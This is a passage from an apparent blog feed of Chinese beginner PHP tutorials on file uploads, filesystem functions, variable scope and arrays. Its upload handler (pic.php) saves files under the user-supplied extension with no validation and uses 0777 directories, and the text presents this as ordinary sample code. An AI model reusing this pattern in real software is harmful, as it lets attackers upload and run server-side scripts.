punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pic.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment"># 如果传过来的文件的大小等于0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># 弹出请上传文件并返回之前的页面</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('请上传文件！');location.href='"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_REFERER"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"';&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 定义常量PATH，常量的值为当前目录的上级目录</span>        <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PATH"</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 构造新的路径</span>        <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">PATH</span> <span class="token punctuation">.</span> <span class="token string">"/upload/img"</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 设置默认时区</span>        <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string">'UTC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 设置文件夹日期以年月日命名</span>        <span class="token variable">$dir1</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Ym"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir2</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 生成新的文件路径赋值给fullpath</span>        <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir1</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir2</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 如果fullpath是一个文件</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token shell-comment comment"># 弹出上传成功并跳回上传页面</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功！');location.href='"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_REFERER"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"'&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token shell-comment comment"># 否则生成以fullpath命名的文件夹</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token shell-comment comment"># 随机命名文件名</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 用strrchr()函数获取上传文件的后缀名，赋值给filetype</span>        <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 重新命名文件名为：随机数字+固定文件后缀</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token variable">$filetype</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 将上传的文件上传到指定的文件夹中，并重新命名</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$fullpath</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件管理的基本函数"><a href="#文件管理的基本函数" class="headerlink" title="文件管理的基本函数"></a>文件管理的基本函数</h3><h5 id="realpath"><a href="#realpath" class="headerlink" title="realpath()"></a>realpath()</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103194733808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>返回绝对路径，我们来试一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token string">'../../'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103195014172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="opdir-和readdir"><a href="#opdir-和readdir" class="headerlink" title="opdir()和readdir()"></a>opdir()和readdir()</h5><p>opendir()打开目录句柄，readdir()是读取句柄中的目录：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103233949629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="is-dir"><a href="#is-dir" class="headerlink" title="is_dir()"></a>is_dir()</h5><p>判断给定文件是否是一个目录：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string">"pic.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'yes'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103234825843.png#pic_center" alt="在这里插入图片描述"></p><h5 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h5><p>删除文件</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 此时文件夹中的aaa.txt会被删除</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"aaa.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="file-get-contents-和file-put-contents"><a href="#file-get-contents-和file-put-contents" class="headerlink" title="file_get_contents()和file_put_contents()"></a>file_get_contents()和file_put_contents()</h5><p>这两个函数，get是把整个文件内容处理成一个字符串，而put是将一串字符串写入文件，我们来实现一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"session1.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"session1.php"</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104000345150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的常量变量及作用域</title>
      <link href="/posts/31fcd791.html"/>
      <url>/posts/31fcd791.html</url>
      
        <content type="html"><![CDATA[<h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><pre><code>define('常量名',‘常量值’)</code></pre><h5 id="defind"><a href="#defind" class="headerlink" title="defind()"></a>defind()</h5><p>检测是否定义过常量</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'PI'</span><span class="token punctuation">,</span> <span class="token number">3.1415926</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 返回true</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">'PI'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h5 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h5><p>超全局变量在上一篇文章中已经做过详细的笔记了<a href="https://blog.csdn.net/qq_43573676/article/details/109447031" target="_blank" rel="noopener">超全局变量</a></p><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><p>全局变量就是谁都可以调用这个变量，全局可用的变量：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># a跟b都是全局变量</span><span class="token variable">$a</span> <span class="token operator">=</span> aaaa<span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h5><p>局部变量一般出现在函数里面，就只有在这个函数或循环中可以用：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$i"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 这里不会输出i，并且会报错</span><span class="token keyword">echo</span> <span class="token string">'此时i并不会被调用'</span><span class="token punctuation">.</span><span class="token string">"$i"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="调用全局变量"><a href="#调用全局变量" class="headerlink" title="调用全局变量"></a>调用全局变量</h5><p>调用全局变量用global加变量名，即可在函数中调用全局变量：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># 调用全局变量aa</span>    <span class="token keyword">global</span> <span class="token variable">$aa</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$i&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 输出全局变量aa</span>    <span class="token keyword">echo</span> <span class="token string">"$aa"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102190833646.png#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的数组</title>
      <link href="/posts/8ff1a59d.html"/>
      <url>/posts/8ff1a59d.html</url>
      
        <content type="html"><![CDATA[<h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$arrayName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>xx<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数组的形式有两种，一种是索引数组，一种是关联数组，关联行数组它的key是自己定义的，索引型数组的key是程序给的：</p><h3 id="关联型数组"><a href="#关联型数组" class="headerlink" title="关联型数组"></a>关联型数组</h3><p>格式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h3><p>用到的是<strong>foreach()</strong>函数：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'---'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201101214218588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="数组的增删改查"><a href="#数组的增删改查" class="headerlink" title="数组的增删改查"></a>数组的增删改查</h3><h5 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h5><p>在数组后跟一个[]，然后把要添加的数据赋值给它即可</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据前的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 增加数据</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ff'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据后的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201101214906917.png#pic_center" alt="在这里插入图片描述"></p><h5 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h5><p>这里用到unset()函数，格式就是unset($arrName[x])，x为数组中数据的下标：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'niubi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'key1'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'wuhan'</span><span class="token punctuation">,</span>    <span class="token string">'key2'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'jinan'</span><span class="token punctuation">,</span>    <span class="token string">'key3'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据前的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 增加数据</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ff'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出增加数据后的数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 删除数组arr中的第一个数据，并输出arr当前数据</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" 